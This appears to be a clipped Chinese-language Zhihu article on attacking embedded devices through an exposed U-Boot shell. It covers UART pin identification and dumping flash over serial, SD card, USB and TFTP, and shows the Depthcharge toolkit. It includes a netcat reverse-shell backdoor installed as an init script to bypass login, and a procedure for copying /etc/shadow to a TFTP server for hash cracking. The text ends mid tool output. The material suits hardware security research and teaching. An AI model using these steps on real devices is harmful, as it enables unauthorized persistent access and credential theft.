---
title: "Hack Uboot"
source: "https://zhuanlan.zhihu.com/p/918186739"
author:
  - "[[TrustZone​​​海思技术有限公司 员工]]"
published:
created: 2026-05-03
description: "在硬件评估过程中，经常会遇到采用U-Boot的设备。本文旨在阐述U-Boot是什么，从攻击角度来看它为何如此吸引人，以及这种流行的引导程序所关联的攻击面。U-Boot 特性U-Boot，即通用引导加载程序（Universal Boot Lo…"
tags:
  - "clippings"
---
[收录于 · ARM/Linux嵌入式](https://www.zhihu.com/column/c_1892354515245703770)

11 人赞同了该文章

**在硬件评估过程中，经常会遇到采用 [U-Boot](https://zhida.zhihu.com/search?content_id=249077745&content_type=Article&match_order=1&q=U-Boot&zhida_source=entity) 的设备。本文旨在阐述U-Boot是什么，从攻击角度来看它为何如此吸引人，以及这种流行的引导程序所关联的攻击面。**

## U-Boot 特性

U-Boot，即通用引导加载程序（Universal Boot Loader），是一种用于基于PowerPC、ARM、MIPS等处理器的嵌入式板卡的引导程序，它可以被安装在启动ROM中，用于初始化和测试硬件，或下载和运行应用程序代码(1)。所有支持的设备都可以作为ROM使用：SD卡、SATA硬盘、NOR闪存、NAND闪存等。U-Boot提供了许多功能，如网络支持、USB协议栈支持、加载RAM磁盘等。它还能实现多种文件系统，包括FAT32、ext2、ext3或ext4。

**为了提供U-Boot的一般背景，以下是加载嵌入式设备操作系统(OS)时遵循的步骤：**

- **CPU启动** ：系统通电后，CPU开始执行其复位向量，初始化CPU及其外围组件。
- **Boot ROM代码** ：CPU开始执行存储在只读存储器(ROM)中的启动代码，该代码负责初始化硬件并加载引导程序。
- **引导程序加载** ：Boot ROM代码从非易失性存储设备（如NAND闪存）读取引导程序（U-Boot）到系统内存。
- **引导程序初始化** ：U-Boot初始化自身和硬件，为加载操作系统做准备。
- **操作系统加载** ：U-Boot从非易失性存储读取操作系统镜像到内存，并把控制权交给操作系统。
- **操作系统初始化** ：操作系统初始化自身，配置硬件并启动用户界面或应用程序。

**U-Boot还提供了命令行界面。实际上，有两个。一个旧的“简单”命令行，以及功能更强大的“hush” shell(2)。命令行由CONFIG\_CMDLINE环境变量配置，默认情况下是启用的。但是，在 [SPL](https://zhida.zhihu.com/search?content_id=249077745&content_type=Article&match_order=1&q=SPL&zhida_source=entity) 模式（二级程序加载器）中它不被启用。**

**SPL是什么？让我们详细解释一下。**

许多启动源并不是直接映射到内存的。实际上，芯片上的ROM会将一个二进制文件加载到一个可能非常小的SRAM中（大约4 KiB或更小）。SPL是一个小型的二进制文件，由U-Boot源代码生成，目的是适应SRAM并加载主U-Boot到系统RAM中。

![](https://pic1.zhimg.com/v2-5b5a7243c7d8c7f683a9082c21f6ca98_1440w.jpg)

**还有U-Boot [TPL](https://zhida.zhihu.com/search?content_id=249077745&content_type=Article&match_order=1&q=TPL&zhida_source=entity) （三级程序加载器），它比SPL更小，因为适用于资源极其有限的系统，但几乎从未被使用。**

**让我们回到主题。我们知道U-Boot具有网络和连接功能，以及命令行界面。那么我们如何利用这些功能呢？**

---

**重点：**

- **U-Boot** ：一种广泛使用的引导加载程序，支持多种处理器。
- **网络支持** ：U-Boot具备网络功能。
- **命令行界面** ：U-Boot提供两个命令行界面，包括一个功能强大的“hush” shell。
- **SPL** ：二级程序加载器，用于将主U-Boot加载到系统RAM中。
- **TPL** ：三级程序加载器，适用于资源极其有限的系统。
- **攻击面** ：与U-Boot相关的潜在攻击面。

## 使用暴露的U-Boot Shell

暴露的U-Boot Shell允许用户读取和写入内存中的数据。实现这一功能的方法多种多样，复杂程度不一。通过这些方法，用户可以转储闪存内存，对其进行修改，然后重新上传，或者仅仅加载另一个固件。这些操作可以通过 [UART](https://zhida.zhihu.com/search?content_id=249077745&content_type=Article&match_order=1&q=UART&zhida_source=entity) （通用异步收发传输器）来完成。

UART是一种硬件通信协议，它使用可配置速度的异步串行通信(3)。异步通信意味着发送设备输出的比特流与接收端之间没有时钟信号进行同步。因此，发送和接收设备必须使用相同的配置设置，包括：

- 波特率（符号速率的单位，以比特每秒计。表示符号变化的次数(4)）。
- 数据位大小。
- 校验位（添加到二进制代码串中的一位，用于错误检测）。
- 停止位的大小。

通常，嵌入式设备上的调试引脚通过UART对外提供。

![](https://pica.zhimg.com/v2-8bb2c37e01914ebcdc341a9915371e42_1440w.jpg)

以下是识别这些引脚的方法：

1. 使用万用表找到GND引脚（例如，你可以查阅ROM的数据手册，确定哪个引脚是GND，然后将它与万用表连接以进行验证）。
1. 使用逻辑分析仪找到TX引脚（即发送数据的发送器），并测量其波特率。
1. 第三个引脚应该是RX引脚（即接收数据的接收器）。
1. 如果有第四个引脚，它可能是VCC，即设备的电源输入。你可以使用万用表测量电压来找到它。如果你没有通过主电源为设备供电，可以使用VCC引脚。
1. 然后，如果我们幸运的话，所有这些信息都可能直接印在PCB上：
![](https://pic4.zhimg.com/v2-a26f72f0dbbc27a7422c6662a4d79a1f_1440w.jpg)

然而，有些制造商会在你应当插入UART设备的RX引脚的位置打印上"RX"，但这实际上是没有意义的，正如我们下面将要解释的。因此，我们总是倾向于使用逻辑分析仪来确认引脚的正确性。

## UART与未受保护的Shell

下一步是将每个引脚连接到接收器：

![](https://pic2.zhimg.com/v2-4e030634f947abd5e7faaeb753a9f8e3_1440w.jpg)

最后，连接所有引脚。在本文中，我们将使用 [Hydrabus](https://zhida.zhihu.com/search?content_id=249077745&content_type=Article&match_order=1&q=Hydrabus&zhida_source=entity) (5)，但您可以使用任何TTL接收器。我们测量波特率，然后连接嵌入式设备：

```
U-Boot SPL 2013.07 (May 07 2019 - 13:20:56)
Timer init
[...]
sdram init finished
SDRAM init ok
board_init_r
image entry point: 0x80100000

U-Boot 2013.07 (May 07 2019 - 13:20:56)

Board: ISVP (Ingenic XBurst T21 SoC)
DRAM:  64 MiB
Top of RAM usable for U-Boot at: 84000000
Reserving 446k for U-Boot at: 83f90000
Reserving 32832k for malloc() at: 81f80000
Reserving 32 Bytes for Board Info at: 81f7ffe0
Reserving 124 Bytes for Global Data at: 81f7ff64
Reserving 128k for boot params() at: 81f5ff64
Stack Pointer at: 81f5ff48
Now running in RAM - U-Boot at: 83f90000
MMC:   msc: 0
the manufacturer ef
SF: Detected W25Q64
[...]
Hit any key to stop autoboot:  0
the manufacturer ef
SF: Detected W25Q64
--->probe spend 4 ms
SF: 2621440 bytes @ 0x80000 Read: OK
--->read spend 422 ms
## Booting kernel from Legacy Image at 80600000 ...
   Image Name:   Linux-3.10.14__isvp_turkey_1.0__
   Image Type:   MIPS Linux Kernel Image (lzma compressed)
   Data Size:    1503922 Bytes = 1.4 MiB
   Load Address: 80010000
   Entry Point:  803a6fb0
   Verifying Checksum ... OK
   Uncompressing Kernel Image ... OK
(Len of pw_cmdline):195,(Len of pw_cmdinfo):218
pw_cmdline:console=ttyS1,115200n8 mem=39M@0x0 rmem=25M@0x2700000 init=/linux)
pw_cmdinfo:HWID=0000000000000000000000000000000000000000 ID=00000000000000001
Starting kernel ...
```

如我们所见，在启动序列期间可以检索到大量信息，包括Linux内核版本、加载地址等。在这里，如上所述，U-Boot SPL首先启动，然后是U-Boot，最后是内核。从我们的串行连接来看，在启动序列的最后没有操作系统的Shell。然而，在启动序列期间，当提示按任意键时，可以获得U-Boot Shell。如前所述，我们可以看到在U-Boot SPL中不可能有一个Shell。要列出所有可用的命令，请使用help命令：

```
[...]
Hit any key to stop autoboot:  0 
isvp_t21# help
?       - alias for 'help'
base    - print or set address offset
boot    - boot default, i.e., run 'bootcmd'
boota   - boot android system
bootd   - boot default, i.e., run 'bootcmd'
bootm   - boot application image from memory
bootp   - boot image via network using BOOTP/TFTP protocol
chpart  - change active partition
cmp     - memory compare
coninfo - print console devices and information
cp      - memory copy
crc32   - checksum calculation
echo    - echo args to console
env     - environment handling commands
ethphy  - ethphy contrl
fatinfo - print information about filesystem
fatload - load binary file from a dos filesystem
fatls   - list files in a directory (default /)
gettime - get timer val elapsed,
go      - start application at address 'addr'
help    - print command description/usage
loadb   - load binary file over serial line (kermit mode)
loads   - load S-Record file over serial line
loady   - load binary file over serial line (ymodem mode)
loop    - infinite loop on address range
md      - memory display
mm      - memory modify (auto-incrementing address)
mmc     - MMC sub system
mmcinfo - display MMC info
mtdparts- define flash/nand partitions
mw      - memory write (fill)
nm      - memory modify (constant address)
ping    - send ICMP ECHO_REQUEST to network host
printenv- print environment variables
reset   - Perform RESET of the CPU
run     - run commands in an environment variable
saveenv - save environment variables to persistent storage
setenv  - set environment variables
sf      - SPI flash sub-system
sleep   - delay execution for some time
source  - run script from memory
tftpboot- boot image via network using TFTP protocol
version - print monitor, compiler and linker version
```

根据U-Boot的安装情况，您可能有不同命令可用。让我们列出一些可以用来读取/写入内存的命令。

## 使用U-Boot提取固件

在进入Shell之前，重要的是要理解为什么我们想要从U-Boot提取或写入数据。事实上，在某些情况下，闪存并不容易被访问：

- 引脚不可访问。
- 引脚可访问，但必须进行拆焊（闪存为SoC供电，并且没有可访问的复位引脚）。

我们假设已经有一个U-Boot Shell，并希望提取闪存内存。 `printenv` 命令列出了所有环境变量，这些在U-Boot中是信息的宝库。

```
# printenv
HWID=0000000000000000000000000000000000000000
ID=0000000000000000000000000000000000
IP=192.168.1.140
MAC=40:6A:8E:61:28:51
SENSOR=F23
SSID_NAME=LSX1234
SSID_VALUE=abcd123456
TYPE=T21N
WIFI=8188FTV
baudrate=115200
bootargs=console=ttyS1,115200n8 mem=39M@0x0 rmem=25M@0x2700000 init=/linuxrc rootfstype=squashfs root=)
bootcmd=sf probe;sf read 0x80600000 0x80000 0x280000; bootm 0x80600000
bootdelay=1
ethact=Jz4775-9161
ethaddr=40:6A:8E:61:28:51
gatewayip=193.169.4.1
ipaddr=193.169.4.81
ipncauto=1
ipncuart=1
loads_echo=1
netmask=255.255.255.0
serverip=193.169.4.2
stderr=serial
stdin=serial
stdout=serial

Environment size: 758/65532 bytes
```

让我们解释一下 `bootcmd` 变量的内容：

- `sf probe` ：初始化闪存。
- `sf read 0x80600000 0x80000 0x280000` ：从地址0x80000开始，将0x280000字节复制到0x80600000。
- `bootm 0x80600000` ： `bootm` 命令用于启动操作系统镜像，为此需要内存地址作为参数，以知道它的位置。

现在我们对内存结构有了更好的理解，让我们深入了解可用于提取整个闪存内存的不同方法。

### 通过串行连接转储

如果闪存内存不是太大，可以使用这种方法。安装minicom，使用它连接到你的U-Boot Shell，然后输入CTRL-A L，并选择一个文件名。这允许我们将任何输出保存到指定的文件中。

![](https://pic2.zhimg.com/v2-8c22473ba524e0ce100e5ee65037c37b_1440w.jpg)

首先，初始化闪存（ `sf probe` ）。然后，为了确定闪存的大小，我们可以尝试将比闪存大的内容复制到RAM中，这将在生成的错误消息中显示闪存的大小。在当前情况下，我们假设RAM从0x80600000开始，这是从之前提取的信息中得知的。此外，由于U-Boot启动时打印的日志，我们知道U-Boot可用的RAM顶部位于内存地址0x84000000。让我们试一试：

```
sf read 0x80600000 0x0 0x10000000
ERROR: attempting read past flash size (0x800000)
--->read spend 5 ms
```

现在我们已经知道了闪存的大小，我们可以将它全部复制到RAM吗？0x84000000 - 0x80600000 = 0x3A00000。是的，我们可以。使用正确的大小再次复制到RAM：

```
sf read 0x80600000 0x0 0x800000
SF: 8388608 bytes @ 0x0 Read: OK
--->read spend 1345 ms
```

读取这些字节：

```
md.b 0x80600000 0x800000
```

终端中的每一行是80个字符长，并且只包含16个字节，如你所见：

```
md.b 0 10
00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
```

所以以115200 b/s的速度，转储闪存将需要一些时间。但串行连接是安全的，因此非常有效。然而，你可能会猜到这种方法不能用于转储128 GB的eMMC。当转储完成后，我们使用CTRL-A L关闭捕获，并使用文本编辑器删除转储输出前后的所有内容。要将纯文本输出转换回二进制文件，可以使用xxd。它将用零填充直到达到转储的起始地址，所以不要忘记添加正确的偏移量：

```
binwalk -o 0x80600000 flash.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
2153973432    0x806306B8      CRC32 polynomial table, little endian
2153977780    0x806317B4      LZO compressed data
2153981564    0x8063267C      Android bootimg, kernel size: 0 bytes, kernel addr: 0x70657250, ramdisk size: 543519329 bytes, ramdisk addr: 0x6E72656B, product name: "mem boot start"
2154299392    0x80680000      uImage header, header size: 64 bytes, header CRC: 0x345A4340, created: 2019-04-18 00:43:41, image size: 1503922 bytes, Data Address: 0x80010000, Entry Point: 0x803A6FB0, data CRC: 0xAB59224B, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "Linux-3.10.14__isvp_turkey_1.0__"
2154299456    0x80680040      LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes
[...]
```

也可以使用 `uboot-mdb-dump(6)` 将你的纯文本文件转换为二进制。

在接下来的部分中，我们假设已经将闪存内存加载到RAM中。

### 使用SD卡转储

如果可用， `mmc` 命令也可以用来直接从设备的外部SD卡外设读取/写入。

```
# mmc
mmc - MMC sub system

Usage:
mmc read addr blk# cnt
mmc write addr blk# cnt
mmc erase blk# cnt
mmc rescan
mmc part - lists available partition on current mmc device
mmc dev [dev] [part] - show or set current mmc device [partition]
mmc list - lists available devices
```

要写入SD卡，我们必须指定我们想要开始复制的闪存内存地址（addr）、SD卡上的块偏移（blk#）以及块计数的大小（cnt）。

我们列出设备以查看我们的SD卡是否被检测到：

```
# mmc list
msc: 0
```

然后，我们使用相同的方法来检索闪存大小。将闪存复制到RAM并写入SD卡。我们知道闪存大小为8388608字节，通常，磁盘有一个固定的扇区大小，通常为512字节，所以8388608/512 = 16384，十六进制表示为：0x4000。

```
# mmc write 0x80600000 0 0x4000  
MMC write: dev # 0, block # 0, count 16384 ... 16384 blocks write: OK
```

如果遇到任何问题，请事先格式化SD卡： `dd if=/dev/zero of=/dev/sda bs=1` 。要从卡中提取数据：

如果检测到分区，只需挂载你想要从中读取数据的分区。

如果没有检测到分区，使用dd：

```
# dd if=/dev/sda of=sdcard.bin count=16384
16384+0 records in
16384+0 records out
8388608 bytes (8.4 MB, 8.0 MiB) copied, 0.507568 s, 16.5 MB/s
```

我们可以看到闪存被正确提取：

```
# binwalk sdcard.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
198328        0x306B8         CRC32 polynomial table, little endian
202676        0x317B4         LZO compressed data
206460        0x3267C         Android bootimg, kernel size: 0 bytes, kernel addr: 0x70657250, ramdisk size: 543519329 bytes, ramdisk addr: 0x6E72656B, product name: "mem boot start"
524288        0x80000         uImage header, header size: 64 bytes, header CRC: 0x345A4340, created: 2019-04-18 00:43:41, image size: 1503922 bytes, Data Address: 0x80010000, Entry Point: 0x803A6FB0, data CRC: 0xAB59224B, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "Linux-3.10.14__isvp_turkey_1.0__"
524352        0x80040         LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes
2162688       0x210000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2616010 bytes, 444 inodes, blocksize: 131072 bytes, created: 2019-06-20 11:18:19
5046272       0x4D0000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 1451982 bytes, 29 inodes, blocksize: 131072 bytes, created: 2019-06-20 11:18:20
6619136       0x650000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 843702 bytes, 122 inodes, blocksize: 131072 bytes, created: 2019-06-20 11:18:20
7471104       0x720000        JFFS2 filesystem, little endian
[...]
```

### 通过USB转储

如果可用， `usb` 命令也可以帮助从设备的外部USB外设读取/写入数据。

```
# usb
usb - USB sub-system

Usage:
usb start - start (scan) USB controller
usb reset - reset (rescan) USB controller
usb stop [f] - stop USB [f]=force stop
usb tree - show USB device tree
usb info [dev] - show available USB devices
usb test [dev] [port] [mode] - set USB 2.0 test mode
    (specify port 0 to indicate the device's upstream port)
    Available modes: J, K, S[E0_NAK], P[acket], F[orce_Enable]
usb storage - show details of USB storage devices
usb dev [dev] - show or set current USB storage device
usb part [dev] - print partition table of one or all USB storage    devices
usb read addr blk# cnt - read \`cnt' blocks starting at block \`blk#'
    to memory address \`addr'
usb write addr blk# cnt - write \`cnt' blocks starting at block \`blk#'
    from memory address \`addr'
```

将USB外设插入设备后启动USB控制器。如果它被正确检测到，那么我们可以将闪存写入其中：

```
# usb start
starting USB...
Bus usb@10180000: Bus usb@101c0000: USB EHCI 1.00
Bus usb@101e0000: USB OHCI 1.0
scanning bus usb@10180000 for devices... 1 USB Device(s) found
[...]
# usb info
[...]

2: Mass Storage, USB Revision 2.10
- USB DISK 3.0 0719146D1CBF9257
- Class: (from Interface) Mass Storage
- PacketSize: 64 Configurations: 1
- Vendor: 0x13fe Product 0x6300 Version 1.0
Configuration: 1
- Interfaces: 1 Bus Powered 498mA
Interface: 0
- Alternate Setting 0, Endpoints: 2
- Class Mass Storage, Transp. SCSI, Bulk only
- Endpoint 1 In Bulk MaxPacket 512
- Endpoint 2 Out Bulk MaxPacket 512
[…]

# usb write 0x80600000 0 0x4000
```

完成之后，可以应用与SD卡相同的方法来提取内容。

### 使用TFTP转储

TFTP（Trivial File Transfer Protocol）是一种文件传输协议，可以集成到U-Boot中。它可以用来复制嵌入式设备内外的数据。如上所述，U-Boot在环境变量中存储设置。要使用TFTP，只需在环境变量中更改嵌入式设备的IP地址以及服务器的IP地址，并保存这些值：

```
# setenv ipaddr <IP_embedded_device>
# setenv serverip <IP_server>
# saveenv
```

如果有DHCP服务器，我们可以简单地运行 `dhcp` 命令，而不是指定 `ipaddr` 变量。之后，我们可以在主机上安装一个TFTP服务器，在服务器上创建一个文件，并允许对该文件写入权限：

```
# cd /srv/tftp
# sudo touch flash.bin
# sudo chmod 666 firmware.bin
```

最后，我们可以使用以下命令从U-Boot Shell复制数据：

```
# tftp 0x80600000 flash.bin 0x800000
```

## 读写内容

一些其他有趣的命令提供了有用的功能，当我们尝试利用U-Boot来利用嵌入式设备时，我们可以滥用这些功能。

### bdinfo

`bdinfo` 命令打印U-Boot处理的有关板卡的信息，例如内存地址和大小：

```
# bdinfo

arch_number     = 0x000008e0
boot_params     = 0x60002000
DRAM bank       = 0x00000000
-> start        = 0x60000000
-> size         = 0x10000000
DRAM bank       = 0x00000001
-> start        = 0x80000000
-> size         = 0x00000004
eth0name        = smc900x-1
ethaddr         = b4:45:06:6b:e7:7b
current eth     = smc900x-1
ip_addr         = <NULL>
baudrate        = 115200 bps
TLB addr        = 0x6fff00000
relocaddr       = 0x6ff8b000
reloc off       = 0x0f78b000
irq_sp          = 0x6fe8aee0
sp start        = 0x6fe8aed0
```

### rksfc

`rksfc` 命令与RockChip的SPI SFC（串行闪存控制器）接口工具有关。它允许我们：

- 提取内存中的信息：
```
# rksfc scan
# rksfc information
Device 0: Vendor: 0x0308 Rev: V1.00 Prod: rkflash-SpiNand
Type: Hard Disk
Capacity: 107.7 MB = 0.1 GB (220672 x 512)
# rksfc device 0
Device 0: Vendor: 0x0308 Rev: V1.00 Prod: rkflash-SpiNand
Type: Hard Disk
Capacity: 107.7 MB = 0.1 GB (220672 x 512)
... is now current device
# rksfc part 0

Partition Map for SPINAND device 0 -- Partition Type: EFI

Part Start LBA End LBA Name
Attributes
Type GUID
Partition GUID
1 0x00001000 0x00002fff "uboot"
[...]
2 0x00003000 0x00003fff "trust"
[...]
3 0x00004000 0x000097ff "boot"
[...]
```
- 将数据写入RAM。这特别有用，因为我们只能提取我们想要的分区，因为我们有所有的地址可以使用：
```
# rksfc read 0x80600000 0 0x800000
```

### 将数据写入文件系统

假设我们有一个可以通过U-Boot访问的以太网/无线连接的设备。然后我们可以在文件系统中放置一个后门，以绕过登录提示。

首先，我们创建一个包含反向Shell的文件：

```
cat <<EOF > backdoor
#!/bin/sh
while true; do nc <ip_host> <port> -e /bin/sh; done
EOF
```

然后，我们创建服务：

```
cat <<EOF > s99backdoor
#!/bin/sh
case "$1" in
  start)
    /var/backdoor &
    [ $? = 0 ] && echo "Started" || echo "Failed to start"
    ;;
  stop)
    /var/backdoor &
    [ $? = 0 ] && echo "Stopped" || echo "Failed to stop"
    ;;
  reload)
    "$0" stop
    "$0" start
    ;;
  *)
  echo "How to: $0 {start | stop | reload}"
  exit 1
esac

exit $?
```

我们将这些文件添加到TFTP服务器并启动设备。记录下RAM的起始地址后，我们配置网络和主机IP地址。然后，我们将文件保存到RAM中：

```
# tftp 0x80600000 backdoor
[...]
Filename 'backdoor'
Load address: 0x80600000
Loading: #
0 Bytes/s
done
Bytes transferred = 66 (42 hex)
[...]
# tftp 0x81600000 s99backdoor
[...]
Filename 's99backdoor'
Load address: 0x81600000
Loading: #
0 Bytes/s
done
Bytes transferred = 329 (149 hex)
[...]
```

然后，我们将RAM中的后门服务写入文件系统：

```
# ext4write mmc 0:1 0x80600000 /var/backdoor 42
File System is consistent
update journal finished
66 bytes written in 400 ms (0 Bytes/s)
# ext4write mmc 0:1 0x81600000 /etc/init.d/s99backdoor 149
File System is consistent
update journal finished
329 bytes written in 250 ms (0 Bytes/s)
```

最后，我们只需要在重启后监听传入的连接。

### 从文件系统读取数据

你喜欢破解哈希值吗？好消息，我们可以直接再次使用TFTP服务器提取 `/etc/shadow` ！让我们读取包含文件系统的eMMC的内容：

```
# ext2ls mmc 0:1 /
<DIR> 1024 .
<DIR> 1024 ..
<DIR> 3072 bin
<DIR> 1024 dev
<DIR> 1024 etc
[...]
```

接下来，我们读取 `/etc/shadow` 文件的大小：

```
# ext2ls mmc 0:1 /etc/shadow
25 shadow
```

25是16进制的0x19，所以我们将 `/etc/shadow` 的内容写入RAM：

```
# ext4load mmc 0:1 0x80600000 /etc/shadow 0x19
25 bytes read in 99 ms (0 Bytes/s)
```

最后，将其写入我们的TFTP服务器：

```
# tftpput 0x80600000 0x19 shadow
[...]
Filename shadow
Save address: 0x80600000
Save size: 0x19
Saving: #
0 Bytes/s
done
[...]
```

### 附加：Depthcharge

我们谈论U-Boot的安全性时，不能不提到Depthcharge。Depthcharge是由NCC Group设计的工具包，用于支持使用Das U-Boot引导加载程序的嵌入式平台的安全研究和“越狱”操作，以下简称为“U-Boot”(7)。

首先， `depthcharge-inspect` 脚本可以用来从目标设备收集各种信息。

为了配合我们的Hydrabus，我们使用minicom启动一个会话并进入U-Boot shell： 然后，我们使用CTRL+A Z Q退出minicom，但不重置会话。

```
# minicom -D /dev/ttyACM0 -b 115200

> uart
Device: UART1
Speed: 9600 bps
Parity: none
Stop bits: 1
uart1> device 2
Note: UART parameters have been reset to default values.
uart2> speed 115200 b
Final speed: 115068 bps(0.11% err)
Interrupt by pressing user button.

In:    serial
Out:   serial
Err:   serial
Net:   cpm_mphyc_rst = 0x01000000 cpm_mphyc = 0x00000000
Jz4775-9161
Card did not respond to voltage select!
** Bad device mmc 0 **
fs_set_blk_dev failed
platform:T21N,sensor:F23,bootargs:console=ttyS1,115200n8 mem=39M@0x0 rmem=25M@0x2700000 init=/linuxrc|)
Hit any key to stop autoboot:  0
isvp_t21#
```

之后，我们可以使用 `depthcharge-inspect` 开始检查。为此，使用以下标志：

![](https://pic2.zhimg.com/v2-cda9aacc8b74d577c550c01a724752d1_1440w.jpg)

- `-i` 用于指定串行控制台。
- `-c` 用于将结果提取到配置文件 `first.cfg` 。
- `-m` 用于附加到控制台监视器，这是一个终端。
```
# depthcharge-inspect -i /dev/ttyACM0:115200 -c first.cfg -m term
```

启动一个新的终端，脚本开始运行：

![](https://pic4.zhimg.com/v2-62c29f6d03de38c1f28bca060d4a03c5_1440w.jpg)

可以看到，脚本尝试执行许多命令（绿色显示），并根据U-Boot shell中的响应，能够判断该命令是否可用。它还检查环境变量、全局数据结构信息和安装的版本（U-Boot、内核等）。最后，所有信息都被写入指定的配置文件，可以从命令行检索有助于在U-Boot shell中读取/写入/执行脚本的命令：

```
# depthcharge-inspect -i /dev/ttyACM0:115200 -c first.cfg
[+] Writing console output to /tmp/depthcharge-monitor.pipe.                                                                                                                 
    Waiting until this is open...
[*] Retrieving detailed command info via "help"                    
[*] Enumerating available MemoryWriter implementations...
[*]   Available: CpMemoryWriter
[*]   Available: CRC32MemoryWriter
[*]   Excluded:  I2CMemoryWriter - Command "i2c" required but not detected.
[*]   Excluded:  LoadbMemoryWriter - Host program "ckermit" required but not found in PATH.
[*]   Excluded:  LoadxMemoryWriter - Command "loadx" required but not detected.
[*]   Available: LoadyMemoryWriter
[*]   Available: MmMemoryWriter
[*]   Available: MwMemoryWriter
[*]   Available: NmMemoryWriter
[*] Enumerating available MemoryReader implementations...
[*]   Available: CpCrashMemoryReader
[*]   Available: CRC32MemoryReader
[!]   Excluded:  GoMemoryReader - Payload deployment+execution opt-in not specified
[*]   Excluded:  I2CMemoryReader - Command "i2c" required but not detected.
[*]   Excluded:  ItestMemoryReader - Command "itest" required but not detected.
[*]   Available: MdMemoryReader
[*]   Available: MmMemoryReader
[*]   Excluded:  SetexprMemoryReader - Command "setexpr" required but not detected.
[*] Enumerating available Executor implementations...
[!]   Excluded:  GoExecutor - Payload deployment+execution opt-in not specified
[*] Enumerating available RegisterReader implementations...
[*]   Available: CpCrashRegisterReader
[*]   Available: CRC32CrashRegisterReader
[*]   Excluded:  FDTCrashRegisterReader - Command "fdt" required but not detected.
[*]   Excluded:  ItestCrashRegisterReader - Command "itest" required but not detected.
[*]   Available: MdCrashRegisterReader
[*]   Available: MmCrashRegisterReader
[*]   Available: NmCrashRegisterReader
[*]   Excluded:  SetexprCrashRegisterReader - Command "setexpr" required but not detected.
[!] Device does not support bdinfo command.
```

需要注意的是，由于以下原因，默认检查配置的结果可能有限：

- 我们没有指定目标CPU架构。
- 我们不允许可能使平台崩溃或重启的激进操作和有效负载。 让我们使用这些选项启动脚本以获得更详尽的结果：
```
# depthcharge-inspect -i /dev/ttyACM0:115200 -c first.cfg -m term --arch arm -AR
```

虽然它并不总是揭示更多信息，但值得尝试。然后， `depthcharge-print` 用于检索存储在设备配置文件中的所有信息：

```
# depthcharge-print -c first.cfg -i all

Architecture: Generic

Supported Commands
================================================================================
h                       
base                    print or set address offset
boot                    boot default, i.e., run 'bootcmd'
boota                   boot android system
bootd                   boot default, i.e., run 'bootcmd'
bootm                   boot application image from memory
bootp                   boot image via network using BOOTP/TFTP protocol
chpart                  change active partition
cmp                     memory compare
coninfo                 print console devices and information
cp                      memory copy
crc32                   checksum calculation
echo                    echo args to console
env                     environment handling commands
ethphy                  ethphy contrl
fatinfo                 print information about filesystem
fatload                 load binary file from a dos filesystem
fatls                   list files in a directory (default /)
gettime                 get timer val elapsed,
go                      start application at address 'addr'
help                    print command description/usage
loadb                   load binary file over serial line (kermit mode)
loads                   load S-Record file over serial line
loady                   load binary file over serial line (ymodem mode)
loop                    infinite loop on address range
md                      memory display
mm                      memory modify (auto-incrementing address)
mmc                     MMC sub system
mmcinfo                 display MMC info
mtdparts                define flash/nand partitions
mw                      memory write (fill)
nm                      memory modify (constant address)
ping                    send ICMP ECHO_REQUEST to network host
printenv                print environment variables
reset                   Perform RESET of the CPU
run                     run commands in an environment variable
saveenv                 save environment variables to persistent storage
setenv                  set environment variables
sf                      SPI flash sub-system
sleep                   delay execution for some time
source                  run script from memory
tftpboot                boot image via network using TFTP protocol
version                 print monitor, compiler and linker version

Environment Variables
================================================================================
HWID=0000000000000000000000000000000000000000
ID=0000000000000000000000000000000000
IP=192.168.1.140
MAC=40:6A:8E:61:28:51
SENSOR=F23
SSID_NAME=LSX1234
SSID_VALUE=abcd123456
TYPE=T21N
WIFI=8188FTV
baudrate=115200
bootargs=console=ttyS1,115200n8 mem=39M@0x0 rmem=25M@0x2700000 init=/linuxrc||/bin/vi rootfstype=squashfs root=/dev/mtdblock2 rw mtdparts=jz_sfc:512K(boot),1600k(kernel),2816k(root))
bootcmd=sf probe;sf read 0x80600000 0x80000 0x280000; bootm 0x80600000
bootdelay=1
ethact=Jz4775-9161
ethaddr=40:6A:8E:61:28:51
gatewayip=193.169.4.1
ipaddr=193.169.4.81
ipncauto=1
ipncuart=1
loads_echo=1
netmask=255.255.255.0
serverip=193.169.4.2
stderr=serial
stdin=serial
stdout=serial

Global Data Structure information
================================================================================
Address: Unknown

Board Data (from bdinfo): Not available

Board Data (found during Jump Table search):
Jump Table Pointer: Unknown
Jump Table Entries: Unknown

Version information
================================================================================
v

U-Boot 2013.07 (May 07 2019 - 13:20:56)
mips-linux-gnu-gcc (Ingenic r2.3.3 2016.12) 4.7.2
GNU ld (Ingenic r2.3.3 2016.12) 2.24.51.20140512
```

如果你阅读了整篇文章，但即使如此，也不知道如何读取/写入内存， `depthcharge-read-mem` 和 `depthcharge-write-mem` 可以为你完成这项工作。这些脚本寻找可用的命令，并选择最适合完成任务的命令：

```
$ depthcharge-read-mem -i /dev/ttyUSB0:115200 -a 0x81000000 -l 512
[*] Using default payload base address: ${loadaddr} + 32MiB
[*] No user-specified prompt provided. Attempting to determine this.
[*] Identified prompt: isvp_t21# 
[*] Retrieving command list via "help"
[*] Reading environment via "printenv"
[!] Disabling payload deployemnt and execution due to error(s).
[!] Payload "READ_MEMORY" not implemented for Generic
[!] Payload "RETURN_MEMORY_WORD" not implemented for Generic
[*] Version: U-Boot 2013.07 (May 07 2019 - 13:20:56)
[*] Enumerating available MemoryWriter implementations...
[*]   Available: CpMemoryWriter
[*]   Available: CRC32MemoryWriter
[*]   Excluded:  I2CMemoryWriter - Command "i2c" required but not detected.
[*]   Excluded:  LoadbMemoryWriter - Host program "ckermit" required but not found in PATH.
[*]   Excluded:  LoadxMemoryWriter - Command "loadx" required but not detected.
[*]   Available: LoadyMemoryWriter
[*]   Available: MmMemoryWriter
[*]   Available: MwMemoryWriter
[*]   Available: NmMemoryWriter
[*] Enumerating available MemoryReader implementations...
